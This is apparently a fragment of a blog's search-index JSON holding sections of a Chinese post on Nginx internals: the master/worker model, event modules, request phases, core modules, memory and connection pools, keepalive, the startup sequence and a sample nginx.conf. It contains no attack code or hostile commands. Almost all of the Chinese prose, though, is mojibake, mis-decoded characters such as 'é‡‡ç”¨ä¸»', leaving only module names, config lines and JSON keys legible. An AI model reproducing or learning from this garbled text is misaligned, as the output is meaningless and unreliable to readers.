é‡‡ç”¨ä¸»ä»æœºåˆ¶ä»¥çœ‹é—¨ç‹—å½¢å¼ç®¡ç†å·¥ä½œè¿›ç¨‹ï¼Œä¸€æ—¦æœ‰å·¥ä½œè¿›ç¨‹å´©æºƒï¼Œç«‹åˆ»å¯åŠ¨æ–°çš„è¿›ç¨‹ä»£æ›¿ã€‚ 3. ä¼¸ç¼©æ€§ ä½¿ç”¨ç»„ä»¶æŠ€æœ¯ï¼Œå¯ä»¥å‡å°‘æˆ–å¢åŠ ä½¿ç”¨çš„ç»„ä»¶æˆ–ä½¿ç”¨è‡ªè¡Œå¼€å‘çš„æ–°ç»„ä»¶ï¼Œä»‹å…¥åˆ°HTTPè¯·æ±‚å¤„ç†çš„ä¸­é—´ç¯èŠ‚ï¼Œæ”¹å˜å¤„ç†è¡Œä¸ºã€‚ 4. ç®€å•æ€§ å¤šç»„ä»¶åŠå¤šé˜¶æ®µçš„æ–¹å¼ä½¿ä¸€ä¸ªHTTPå¤„ç†è¿‡ç¨‹è¢«åˆ†æˆäº†11ä¸ªå°é˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½å¯ä»¥éå¸¸ç®€å•ï¼Œå®¹æ˜“ç†è§£å’Œå®ç°ï¼ŒHTTPå¤„ç†è¿‡ç¨‹å˜æˆäº†æµæ°´çº¿æ¨¡å¼ã€‚ 5. å¯ä¿®æ”¹æ€§ Nginx å®šä½ä¸“ç”¨çš„Web æœåŠ¡å™¨ï¼Œéœ€è¦å…·å¤‡åŠ¨æ€ä¿®æ”¹é…ç½®ã€åŠ¨æ€å‡çº§ã€åŠ¨æ€éƒ¨ç½²çš„èƒ½åŠ›ã€‚ 6. å¯è§æ€§ å…³é”®ç»„ä»¶çš„è¿è¡Œæƒ…å†µå¯ä»¥è¢«ç›‘æ§ï¼Œå¦‚ç½‘ç»œååé‡ã€ç½‘ç»œè¿æ¥æ•°ã€ç¼“å­˜ä½¿ç”¨æƒ…å†µç­‰ã€‚ 7. å¯ç§»æ¤æ€§ è·¨å¹³å°èƒ½åŠ›ï¼ŒNginx æ”¯æŒLinuxã€Unixã€Windowsã€‚ ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:1","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"2. æ¶æ„ æ•´ä½“ä¸Šçœ‹ï¼ŒNginx ä½¿ç”¨äº†äº‹ä»¶é©±åŠ¨çš„æœåŠ¡æ¨¡å‹ï¼Œåœ¨æ¨¡å—æœºåˆ¶ä¸­ä¸“é—¨å®šä¹‰äº† event æ¨¡å—å®ç°äº‹ä»¶é©±åŠ¨ã€‚åœ¨äº‹ä»¶åŸºç¡€ä¸Šï¼ŒNginx ä½¿ç”¨äº†å¤šé˜¶æ®µçš„å¼‚æ­¥æ¨¡å‹ï¼Œå°†å¤„ç†è¿‡ç¨‹ï¼ˆå¦‚HTTPè¯·æ±‚ï¼‰åˆ’åˆ†7ã€9æˆ–11ä¸ªé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½å¼‚æ­¥å¤„ç†ã€‚å°†è¯·æ±‚å¤šé˜¶æ®µå¤„ç†ï¼Œå¯ä»¥è¿›ä¸€æ­¥æ§åˆ¶æ¯ä¸ªè¯·æ±‚çš„æ€»ä½“å¤„ç†æ—¶é—´ï¼Œå› ä¸ºæ¯ä¸ªé˜¶æ®µéƒ½ç»†åŒ–ï¼Œä¸ä¼šå‡ºç°æŸä¸ªé˜¶æ®µè¿‡å¤šå ç”¨CPUå¤„ç†æ—¶é—´çš„é—®é¢˜ã€‚ ç®¡ç†è¿›ç¨‹å’Œå·¥ä½œè¿›ç¨‹çš„æœºåˆ¶ä½¿ Nginx å¯ä»¥å……åˆ†åˆ©ç”¨å¤šå¤„ç†å™¨æœºåˆ¶ã€‚ ä¸‹é¢åˆ†åˆ«ä»‹ç»å…³é”®çš„æŠ€æœ¯ï¼š 1. äº‹ä»¶é©±åŠ¨ Nginx ä¼šæ³¨å†Œå„ç§æ—¶é—´å¤„ç†å™¨æ¥å¤„ç†äº‹ä»¶ï¼Œäº‹ä»¶ä¸»è¦æ¥æºäºç½‘ç»œå’Œç£ç›˜ã€‚event æ¨¡å—è´Ÿè´£æ”¶é›†ã€ç®¡ç†å’Œåˆ†å‘äº‹ä»¶ï¼Œå…¶ä»–çš„æ¨¡å—éƒ½æ˜¯äº‹ä»¶çš„å¤„ç†è€…å’Œæ¶ˆè´¹è€…ï¼Œä¼šæ ¹æ®æ³¨å†Œçš„äº‹ä»¶å¾—åˆ°äº‹ä»¶çš„åˆ†å‘ã€‚ åœ¨ nginx.conf çš„ event{} å—ä¸­é…ç½®ç›¸åº”çš„äº‹ä»¶æ¨¡å—ï¼Œå°±å¯ä»¥å¯ç”¨å¯¹åº”äº‹ä»¶æ¨¡å‹ï¼Œè€Œä¸”å¯ä»¥æ ¹æ®åº”ç”¨åœºæ™¯éšæ—¶åˆ‡æ¢äº‹ä»¶æ¨¡å—ã€‚event æ¨¡å—è¢«æ ¸å¿ƒçš„ ngx_event_module ç®¡ç†ï¼Œå®ƒæ˜¯æ ¸å¿ƒæ¨¡å—ã€‚ Nginx ä¸ºä¸åŒçš„OSå’Œä¸åŒå†…æ ¸ç‰ˆæœ¬æä¾›äº†9ä¸ªäº‹ä»¶æ¨¡å—ï¼Œåˆ†åˆ«ä¸ºï¼šngx_select_moduleã€ngx_eventport_moduleã€ngx_epoll_moduleã€ngx_poll_moduleã€ngx_devpoll_moduleã€ngx_kqueue_moduleã€ngx_aio_moduleã€ngx_rtsig_moduleã€ngx_select_module(Windows)ã€‚ 2. å¼‚æ­¥å¤šé˜¶æ®µå¤„ç† Nginx æŠŠä¸€ä¸ªè¯·æ±‚åˆ’åˆ†æˆå¤šä¸ªé˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½å¯ä»¥ç”±äº‹ä»¶åˆ†å‘å™¨æ¥åˆ†å‘ï¼Œæ³¨å†Œçš„é˜¶æ®µç®¡ç†å™¨ï¼ˆhandlerï¼‰è¿›è¡Œå¯¹åº”é˜¶æ®µçš„å¤„ç†ã€‚é€šä¿—æ¥å°†ï¼ŒNginxçš„å¤šé˜¶æ®µåˆ’åˆ†ç›¸å½“äºäººä¸ºåˆ›é€ äº†å¾ˆå¤šäº‹ä»¶ã€‚ä¾‹å¦‚ï¼Œè·å–ä¸€ä¸ªé™æ€æ–‡ä»¶çš„HTTPè¯·æ±‚å¯ä»¥åˆ’åˆ†ä¸ºä¸‹é¢çš„å‡ ä¸ªé˜¶æ®µï¼š å»ºç«‹TCPè¿æ¥é˜¶æ®µï¼šæ”¶åˆ°TCPçš„SYNåŒ… å¼€å§‹æ¥æ”¶è¯·æ±‚ï¼šæ¥æ”¶åˆ°TCPä¸­çš„ACKåŒ…è¡¨ç¤ºè¿æ¥å»ºç«‹æˆåŠŸ æ¥æ”¶åˆ°ç”¨æˆ·è¯·æ±‚å¹¶åˆ†æè¯·æ±‚æ˜¯å¦å®Œæ•´ï¼šæ¥æ”¶åˆ°ç”¨æˆ·æ•°æ®åŒ… æ¥æ”¶åˆ°å®Œæ•´è¯·æ±‚åå¼€å§‹å¤„ç†ï¼šæ¥æ”¶åˆ°ç”¨æˆ·æ•°æ®åŒ… ç”±é™æ€æ–‡ä»¶è¯»å–éƒ¨åˆ†å†…å®¹ï¼šæ¥æ”¶åˆ°ç”¨æˆ·æ•°æ®åŒ…æˆ–æ¥å—åˆ°TCPä¸­çš„ACKåŒ…ï¼ŒTCPçª—å£å‘å‰æ»‘åŠ¨ã€‚è¯¥è¿‡ç¨‹å¯èƒ½å¤šæ¬¡è§¦å‘ï¼Œç›´åˆ°æŠŠæ–‡ä»¶å…¨éƒ¨è¯»å– å‘é€å®Œæˆåï¼šæ”¶åˆ°æœ€åä¸€ä¸ªåŒ…çš„ACK ç”¨æˆ·ä¸»åŠ¨å…³é—­è¿æ¥ï¼šæ”¶åˆ°TCPä¸­çš„FINæŠ¥æ–‡ æ¯ä¸€ä¸ªäº‹ä»¶ã€æ¯ä¸€ä¸ªé˜¶æ®µå‡ç”± event æ¨¡å—è´Ÿè´£è°ƒç”¨å’Œæ¿€æ´»ï¼Œevent æ¨¡å—ç›‘å¬ç³»ç»Ÿå†…æ ¸æ¶ˆæ¯ï¼Œä»¥æ¿€æ´» Nginx äº‹ä»¶ã€‚ 3. æ¨¡å—åŒ– Nginx é™¤äº†å°‘é‡çš„æ ¸å¿ƒä»£ç ï¼Œå…¶ä»–åŠŸèƒ½å‡åœ¨æ¨¡å—ä¸­å®ç°ï¼Œæ–°åŠŸèƒ½çš„æ‰©å±•é€šè¿‡æ ‡å‡†æ¥å£å’Œæ•°æ®ç»“æ„å¼€å‘æ–°æ¨¡å—å®ç°ï¼Œæ— éœ€æ”¹åŠ¨æ ¸å¿ƒä»£ç å’Œæ ¸å¿ƒæ¨¡å—ï¼Œè¿™ä¸º Nginx å¸¦æ¥è‰¯å¥½çš„æ‰©å±•æ€§å’Œå¯é æ€§ã€‚ Nginx è®¾è®¡äº†6ä¸ªåŸºç¡€ç±»å‹æ¨¡å—ï¼ˆç§°ä¸ºæ ¸å¿ƒæ¨¡å—ï¼‰ï¼Œå®ç°äº† Nginx çš„6ä¸ªä¸»è¦éƒ¨åˆ†ï¼Œä»¥åŠHTTPåè®®ä¸»æµç¨‹ï¼Œåˆ†åˆ«æ˜¯ï¼š ngx_core_module: ç®¡ç†é…ç½®ç­‰å…¨å±€æ¨¡å— ngx_events_module: ç®¡ç†æ‰€æœ‰äº‹ä»¶ç±»å‹æ¨¡å— ngx_openssl_module: ç®¡ç†æ‰€æœ‰TLS/SSLæ¨¡å— ngx_http_module: ç®¡ç†æ‰€æœ‰HTTPç±»å‹æ¨¡å— ngx_mail_module: ç®¡ç†æ‰€æœ‰é‚®ä»¶ç±»å‹æ¨¡å— ngx_errlog_module: ç®¡ç†æ‰€æœ‰æ—¥å¿—ç±»æ¨¡å— è¿™6ä¸ªæ ¸å¿ƒæ¨¡å—åªæ˜¯å®šä¹‰äº†6ç±»ä¸šåŠ¡çš„ä¸šåŠ¡æµç¨‹ï¼Œå…·ä½“å·¥å…·å¹¶ä¸ç”±è¿™äº›æ¨¡å—æ‰§è¡Œï¼Œä¸šåŠ¡æ ¸å¿ƒé€»è¾‘åŠå…·ä½“è¯·æ±‚å¤„ç†ç”±å…¶ä¸‹å±æ¨¡å—è¿›è¡Œå®ç°ã€‚ æ¡†æ¶ç¨‹åºåªéœ€å…³æ³¨å¦‚ä½•è°ƒç”¨æ ¸å¿ƒæ¨¡å—ï¼ŒNginx çš„æ ¸å¿ƒåŠŸèƒ½ç”±æ ¸å¿ƒæ¨¡å—å®Œæˆï¼Œå®ç°ç¬¬ä¸€å±‚æµæ°´çº¿ã€‚æ ¸å¿ƒæ¨¡å—ä¹‹å¤–æ˜¯éæ ¸å¿ƒæ¨¡å—ï¼Œç”±å¯¹åº”çš„æ ¸å¿ƒæ¨¡å—è¿›è¡Œåˆå§‹åŒ–å’Œè°ƒç”¨ã€‚éæ ¸å¿ƒæ¨¡å—å¯ä»¥åŠ¨æ€æ·»åŠ ï¼Œé€šè¿‡é‡æ–°ç¼–è¯‘åŒ…å«è¿› Nginxï¼Œé€šè¿‡é…ç½®æ–‡ä»¶å°†æ¨¡å—ä½¿èƒ½ã€‚ 4. ç®¡ç†è¿›ç¨‹å’Œå·¥ä½œè¿›ç¨‹ ç®¡ç†è¿›ç¨‹ä½œä¸ºå·¥ä½œè¿›ç¨‹çš„ç®¡ç†è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹ï¼Œè¿˜å¯ä»¥å¸¦æ¥é«˜å¯é æ€§ï¼šå·¥ä½œè¿›ç¨‹ç»ˆæ­¢ï¼Œç®¡ç†è¿›ç¨‹å¯ä»¥åŠæ—¶å¯åŠ¨æ–°çš„å®ä¾‹æ¥ç®¡ã€‚è¿™ç§master + workerçš„æ¨¡å¼å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š å……åˆ†åˆ©ç”¨å¤šæ ¸ç³»ç»Ÿçš„å¹¶å‘å¤„ç†èƒ½åŠ›ï¼ŒNginx çš„æ‰€æœ‰å·¥ä½œè¿›ç¨‹éƒ½æ˜¯å¹³ç­‰çš„ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ nginx.conf ä¸­å°†å·¥ä½œè¿›ç¨‹å’Œå¤„ç†å™¨ä¸€ä¸€ç»‘å®šã€‚ è´Ÿè½½å‡è¡¡ï¼Œå·¥ä½œè¿›ç¨‹é—´é€šè¿‡è¿›ç¨‹é—´é€šä¿¡å®ç°è´Ÿè½½å‡è¡¡ï¼Œè¯·æ±‚å®¹æ˜“è¢«åˆ†é…åˆ°è´Ÿè½½è¾ƒè½»çš„å·¥ä½œè¿›ç¨‹ä¸­ã€‚ çŠ¶æ€ç›‘æ§ï¼Œç®¡ç†è¿›ç¨‹åªè´Ÿè´£å¯åŠ¨ã€åœæ­¢ã€ç›‘æ§å·¥ä½œè¿›ç¨‹ã€‚ 5. å†…å­˜æ±  Nginx åœ¨å†…éƒ¨å®ç°äº†ä¸€ä¸ªç®€å•çš„å†…å­˜æ± ï¼Œæ¯ä¸€ä¸ªTCPè¿æ¥å»ºç«‹æ—¶éƒ½ä¼šåˆ†é…ä¸€ä¸ªå†…å­˜æ± ï¼Œè€Œåœ¨è¯·æ±‚ç»“æŸæ—¶é”€æ¯æ•´ä¸ªå†…å­˜æ± ï¼Œå°†ä¹‹å‰åˆ†é…çš„å†…å­˜ä¸€æ¬¡æ€§å½’è¿˜ç»™æ“ä½œç³»ç»Ÿã€‚Nginx çš„å†…å­˜æ± å¹¶ä¸è´Ÿè´£å›æ”¶å·²ç»åˆ†é…å‡ºå»çš„å†…å­˜ï¼Œè¿™äº›å†…å­˜ç”±è¯·æ±‚æ–¹è´Ÿè´£å›æ”¶ã€‚ 6. è¿æ¥æ±  Nginx ä¸ºäº†å‡å°‘åå¤åˆ›å»ºTCPè¿æ¥ä»¥åŠåˆ›å»ºå¥—æ¥å­—çš„æ¬¡æ•°ï¼Œä»è€Œæé«˜ç½‘ç»œå“åº”é€Ÿåº¦ï¼Œåœ¨å†…éƒ¨æä¾›äº†è¿æ¥æ± æœºåˆ¶ã€‚åœ¨Nginx å¯åŠ¨è§£è¯»å“ªï¼Œç®¡ç†è¿›ç¨‹åœ¨é…ç½®æ–‡ä»¶ä¸­è§£æå‡ºå¯¹åº”çš„é…ç½®ï¼Œé…ç½®é¡¹æ”¾åˆ°é…ç½®ç»“æ„ä½“ä¸­ã€‚ æ³¨ï¼šé…ç½®æŒ‡ä»¤ä¸­ worker_connections é…ç½®çš„è¿æ¥æ± å¤§å°æ˜¯å·¥ä½œè¿›ç¨‹çº§åˆ«çš„ï¼Œæ‰€ä»¥è®¾è®¡çš„è¿æ¥æ± å¤§å°æ˜¯ worker_connectionsÂ *Â worker_processesã€‚ 7. æ—¶é—´ç¼“å­˜ Nginx ä¸ºäº†å‡å°‘å¯¹OSçš„æ—¶é—´å‡½æ•° gettimeofday çš„è°ƒç”¨ï¼Œè‡ªå·±å†…éƒ¨å¯¹ç³»ç»Ÿæ—¶é—´è¿›è¡Œäº†ç¼“å†²ï¼Œå†…éƒ¨è®¿é—®æ—¶é—´å®é™…ä¸Šè®¿é—®äº†å†…å­˜ä¸­çš„å‡ ä¸ªå˜é‡ã€‚ 8. å»¶è¿Ÿå…³é—­ Nginx åœ¨è¦å…³é—­è¿æ¥æ—¶ï¼Œå¹¶ä¸ä¼šç«‹åˆ»å…³é—­è¿æ¥ï¼Œè€Œæ˜¯å…ˆå…³é—­TCPè¿æ¥çš„å†™æ“ä½œï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´åå†å…³æ‰è¿æ¥çš„è¯»æ“ä½œã€‚ 9. keepalive Nginx ä¸­å¯ä»¥å¤§é‡çœ‹åˆ°å¯¹ keepalive çš„é…ç½®å’ŒAPIã€‚ å¦‚æœå®¢æˆ·ç«¯çš„è¯·æ±‚å¤´ä¸­çš„ connection ä¸º closeï¼Œ è¡¨ç¤ºå®¢æˆ·ç«¯éœ€è¦å…³æ‰é•¿è¿æ¥ï¼›å¦‚æœå®¢æˆ·ç«¯çš„è¯·æ±‚å¤´ä¸­çš„ connection ä¸º keepaliveï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯éœ€è¦æ‰“å¼€é•¿è¿æ¥ï¼›å¦‚æœæ²¡æœ‰è¯¥å­ç‚–å•Šï¼Œåˆ™æ ¹æ®åè®®ï¼Œå¦‚æœæ˜¯ HTTP 1.0 åˆ™é»˜è®¤ä¸º closeï¼Œ å¦‚æœæ˜¯ HTTP 1.1 åˆ™é»˜è®¤ä¸º keepalive ã€‚ å¦‚æœä¸º keepalive ï¼Œ Nginx ä¼šåœ¨è¾“å‡ºå®Œå“åº”ä½“åï¼Œè®¾ç½®å½“å‰è¿æ¥çš„ keepaliveå±æ€§ï¼Œç„¶åç­‰å¾…å®¢æˆ·ç«¯çš„ä¸‹ä¸€æ¬¡è¯·æ±‚ã€‚ä½†æ˜¯ä¸ä¼šä¸€ç›´ç­‰å¾…ï¼Œä¼šæ ¹æ® keepalive_timeout å€¼å†³å®šç­‰å¾…æ—¶é•¿ã€‚ ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:1:2","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"Nginx çš„å·¥ä½œæµç¨‹ ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:0","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"1. Nginx çš„å¯åŠ¨æµç¨‹ å¯åŠ¨è¿‡ç¨‹æ•´ä½“ä¸Šå¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š æ¡†æ¶ç¨‹åºå¯åŠ¨è¿‡ç¨‹ï¼šåˆ›å»ºå„æ ¸å¿ƒæ¨¡å—å’Œéæ ¸å¿ƒæ¨¡å— æ¨¡å—å¯åŠ¨è¿‡ç¨‹ï¼šæ¨¡å—å†…éƒ¨å®Œæˆè‡ªå·±çš„å¯åŠ¨å’Œåˆå§‹åŒ– å®Œæ•´çš„å¯åŠ¨æµç¨‹å’Œå„é˜¶æ®µè¯´æ˜å¦‚ä¸‹ï¼š å¯åŠ¨æ—¶ï¼ŒNginx æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°ï¼Œè§£æå„ä¸»è¦å‚æ•°ï¼Œå‚æ•°ä¸»è¦å­˜æ”¾åœ¨ nginx.conf æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥æœ€é‡è¦çš„å‚æ•°æ˜¯nginx.confçš„è·¯å¾„ï¼› å¹³æ»‘å‡çº§æŒ‡ä¸é‡å¯æœåŠ¡è¿›è¡Œå‡çº§ï¼Œä¸é‡å¯ç®¡ç†è¿›ç¨‹è€Œé‡å¯æ–°ç‰ˆæœ¬çš„ Nginx ç¨‹åºã€‚æ—§çš„ç®¡ç†è¿›ç¨‹å…ˆè°ƒç”¨ fork å‡½æ•°åˆ›å»ºæ–°è¿›ç¨‹ï¼Œç„¶åæ–°è¿›ç¨‹é€šè¿‡ execve ç³»ç»Ÿè°ƒç”¨å¯åŠ¨æ–°ç‰ˆæœ¬ç®¡ç†è¿›ç¨‹ï¼Œæ—§ç‰ˆæœ¬ç®¡ç†è¿›ç¨‹æ‰‹å¿ƒè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ–°ç‰ˆæœ¬ç®¡ç†è¿›ç¨‹å¯åŠ¨æ—¶æ£€æŸ¥å¯¹åº”ç¯å¢ƒå˜é‡åˆ¤æ–­ä¸ºå¹³æ»‘å‡çº§ï¼Œå¹¶å¯¹é€šè¿‡ç¯å¢ƒå˜é‡ä¼ é€’çš„æ—§ç‰ˆæœ¬ Nginx æœåŠ¡ç›‘å¬çš„å¥æŸ„åšç»§æ‰¿ï¼› æ¡†æ¶é€šè¿‡è°ƒç”¨æ ¸å¿ƒæ¨¡å—çš„ create_conf æ–¹æ³•è®©æ ¸å¿ƒæ¨¡å—åˆ›å»ºç”¨äºå­˜å‚¨å¯¹åº”é…ç½®ä¿¡æ¯çš„ç»“æ„ä½“åˆ›å»ºæ ¸å¿ƒæ¨¡å—ï¼Œç„¶ååœ¨åç»­çš„æ­¥éª¤ä¸­ç»™äºˆé…ç½®æ–‡ä»¶å¯¹ç¯å¢ƒå’Œæ¨¡å—è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™é‡Œä¸»è¦æ˜¯ä¸ºåé¢çš„é…ç½®æ–‡ä»¶è§£æåšå‡†å¤‡ï¼› è°ƒç”¨é…ç½®æ¨¡å—çš„è§£ææ–¹æ³•ï¼Œè§£æ nginx.conf ä¸­çš„é…ç½®é¡¹ï¼Œè°ƒç”¨å¯¹åº”æ ¸å¿ƒæ¨¡å—çš„æ–¹æ³•å°†å±äºå„æ ¸å¿ƒæ¨¡å—çš„é…ç½®é¡¹ä¿å­˜åˆ°æ ¸å¿ƒæ¨¡å—çš„é…ç½®æ•°æ®ç»“æ„ä¸­ï¼› è°ƒç”¨æ‰€æœ‰æ ¸å¿ƒæ¨¡å—çš„ init_conf æ–¹æ³•ï¼Œç”¨äºè®©æ ¸å¿ƒæ¨¡å—æ ¹æ®å†™å…¥å†…éƒ¨é…ç½®æ•°æ®ç»“æ„çš„æ•°æ®å¯¹æ¨¡å—åšå¤„ç†å’Œåˆå§‹åŒ–ï¼› é…ç½®æ–‡ä»¶ä¸­å¯èƒ½é…ç½®äº†ç¼“å­˜æ–‡ä»¶ã€åº“æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ç­‰ï¼ŒåŒæ—¶åŒ…æ‹¬å…±äº«å†…å­˜ï¼Œè¯¥æ­¥éª¤å¯¹è¿™äº›æ–‡ä»¶å’Œå…±äº«å†…å­˜è¿›è¡Œåˆ›å»ºã€æ‰“å¼€æ“ä½œï¼› å¯¹äºé…ç½®äº†ç›‘å¬ç«¯å£çš„æ¨¡å—ï¼ŒæŒ‰é…ç½®å¼€å§‹ç›‘å¬é…ç½®çš„ç«¯å£ï¼Œä¸€èˆ¬HTTPæ¨¡å—ã€streamæ¨¡å—éƒ½ä¼šæœ‰ç›‘å¬ç«¯å£ï¼› è°ƒç”¨æ‰€æœ‰æ¨¡å—çš„ init_module æ–¹æ³•ï¼Œä½¿ç”¨é…ç½®ä¿¡æ¯åˆå§‹åŒ–æ¨¡å—ï¼› å¦‚æœ niginx.conf ä¸­é…ç½®äº† Ngins ä¸º master æ¨¡å¼ï¼Œåˆ™åˆ›å»ºç®¡ç†è¿›ç¨‹â€”â€”masterè¿›ç¨‹ï¼› ç®¡ç†è¿›ç¨‹æ ¹æ®é…ç½®çš„å·¥ä½œè¿›ç¨‹æ•°ï¼Œä½¿ç”¨ä¸€ä¸ªå¾ªç¯å°†æ‰€éœ€è¦çš„å·¥ä½œè¿›ç¨‹ fork å‡ºæ¥ï¼› ç®¡ç†è¿›ç¨‹æ ¹æ®é…ç½®è§£æè¿‡ç¨‹æ—¶è§£æå‡ºæ¥çš„é…ç½®ä¿¡æ¯ï¼Œæ£€æŸ¥å¯¹åº” path é…ç½®æ˜¯å¦é…ç½®å€¼ï¼Œå¦‚æœè¿›è¡Œäº†è®¾ç½®ï¼Œåˆ™ fork å‡ºç‹¬ç«‹çš„ cacheÂ manager è¿›ç¨‹ï¼ˆä¸å·¥ä½œè¿›ç¨‹åŒçº§ï¼‰ï¼Œä¸»è¦ä½œç”¨ä¸ºå°†åç«¯æœåŠ¡å™¨çš„ response ä½¿ç”¨æ–‡ä»¶ç¼“å­˜ä¸‹æ¥ï¼Œä¸‹æ¬¡è¯·æ±‚æ—¶ä¸éœ€è¦å†å‘åç«¯å‘é€è¯·æ±‚ï¼Œä¸€èˆ¬ç”¨åœ¨ upstream{} ä¸­ã€‚è¯¥è¿›ç¨‹ä¼šå®šæœŸæ£€æŸ¥ç¼“å­˜çŠ¶æ€ã€æŸ¥çœ‹ç¼“å­˜æ€»é‡æ˜¯å¦è¶…å‡ºé™åˆ¶ï¼Œå¦‚æœè¶…å‡ºåˆ™åˆ é™¤æœ€å°‘ä½¿ç”¨çš„éƒ¨åˆ†ã€‚æ­¤å¤–ï¼Œè¿˜ä¼šå®šæœŸåˆ é™¤è¿‡æœŸç¼“å­˜çš„æ–‡ä»¶ï¼› ç®¡ç†è¿›ç¨‹æ ¹æ®é…ç½®è§£æè¿‡ç¨‹æ—¶è§£æå‡ºæ¥çš„é…ç½®ä¿¡æ¯ï¼Œæ£€æŸ¥å¯¹åº” path é…ç½®æ˜¯å¦è®¾ç½®äº†å€¼ï¼Œå¹¶ fork å‡ºç‹¬ç«‹çš„cacheÂ loader è¿›ç¨‹ï¼Œå¹¶å»¶è¿Ÿ1åˆ†é’Ÿè¿è¡Œã€‚è¯¥è¿›ç¨‹ä¸»è¦ç”¨é€”æ˜¯éå†é…ç½®æ–‡ä»¶ä¸­ proxy_cache_path æŒ‡å®šçš„ç¼“å­˜è·¯å¾„ä¸­æ‰€æœ‰çš„ç¼“å­˜æ–‡ä»¶ï¼Œæ ¹æ®ç¼“å­˜æ–‡ä»¶è¿›è¡Œç´¢å¼•é‡å»ºï¼Œå³åœ¨ Nginx æœåŠ¡é‡å¯ä¹‹å‰å°†ä¹‹å‰çš„ç¼“å­˜æ–‡ä»¶é‡å»ºç´¢å¼•ï¼› ç®¡ç†è¿›ç¨‹è°ƒç”¨æ‰€æœ‰æ¨¡å—çš„ init_process æ–¹æ³•ï¼Œæ­¤æ—¶å·¥ä½œè¿›ç¨‹çš„å¯åŠ¨å·¥ä½œå°±å®Œæˆäº†ï¼Œå·¥ä½œè¿›ç¨‹è¿›å…¥æ¶ˆæ¯å¾ªç¯ä¸­å¼€å§‹ç­‰å¾…å¤„ç†ç”¨æˆ·è¯·æ±‚ï¼› Nginx ä¸º single æ¨¡å¼ï¼Œç›´æ¥è°ƒç”¨æ‰€æœ‰æ¨¡å—çš„ init_process æ–¹æ³•ï¼Œç›´æ¥å¯åŠ¨å®Œæ¯•ã€‚å•è¿›ç¨‹æ¨¡å¼ä¸‹ï¼Œç½‘ç»œç«¯å£ç›‘å¬ã€æ•°æ®å¤„ç†ç­‰å‡ç”±ç®¡ç†è¿›ç¨‹å¤„ç†ï¼Œå¤šè¿›ç¨‹æ¨¡å¼ä¸‹ï¼Œç½‘ç»œé“¾æ¥å’Œæ•°æ®å¤„ç†ç­‰ç”±å·¥ä½œè¿›ç¨‹å¤„ç†ã€‚single æ¨¡å¼ä¸€èˆ¬ç”¨äºè°ƒè¯•ã€‚ ","date":"2021-05-15","objectID":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/:2:1","tags":["nginx"],"title":"Nginxæ ¸å¿ƒçŸ¥è¯†ç‚¹è®°å½•","uri":"/2021/05/nginx%E5%85%B3%E9%94%AE%E7%82%B9%E8%AE%B0%E5%BD%95/"},{"categories":["Misc"],"content":"2. é…ç½®åŠ è½½æµç¨‹ Nginx æœåŠ¡é€šè¿‡ nginx.conf é…ç½®æ–‡ä»¶å®ç°ï¼Œå› ä¸º Nginx ä¸ºå¤šæ¨¡å—æ¶æ„ï¼Œåœ¨æ¡†æ¶å¯åŠ¨æµç¨‹ä¸­ï¼Œæ¯ä¸ªæ¨¡å—éƒ½ä¼šä¸ºè‡ªå·±åˆ›å»ºä¸€ä¸ªé…ç½®ä¿¡æ¯æ•°æ®ç»“æ„ï¼Œè€Œæ¡†æ¶åˆä¼šè°ƒç”¨æ¨¡å— init_conf æ¥å£ï¼Œå°†é…ç½®é¡¹åŠ è½½åˆ°æ¨¡å—ä¸€çº§ã€‚æ‰€æœ‰é…ç½®é¡¹ä¸­çš„é…ç½®ä»¥é…ç½®å—ä¸ºå•ä½ï¼Œè€Œé…ç½®å—åˆæ˜¯ä¸å†…éƒ¨æ¨¡å—å¯¹åº”çš„ã€‚ 1. é…ç½®æ–‡ä»¶è¯¦è§£ è¿™é‡Œç»™å‡ºä¸€ä¸ª nginx.conf çš„è¯¦ç»†è§£æï¼š #å…¨å±€å— #user nobody; worker_processes 1; #eventå— events { worker_connections 1024; } #httpå— http { #httpå…¨å±€å— include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; #serverå— server { #serverå…¨å±€å— listen 8000; server_name localhost; #locationå— location / { root html; index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } #è¿™è¾¹å¯ä»¥æœ‰å¤šä¸ªserverå— server { ... } } å¯¹è¯¥æ–‡ä»¶çš„å„ä¸ªéƒ¨åˆ†çš„è¯¦ç»†è¯´æ˜å¦‚ä¸‹ï¼š 1. å…¨å±€å— å…¨å±€å—æ˜¯é»˜è®¤é…ç½®æ–‡ä»¶ä»å¼€å§‹åˆ° events 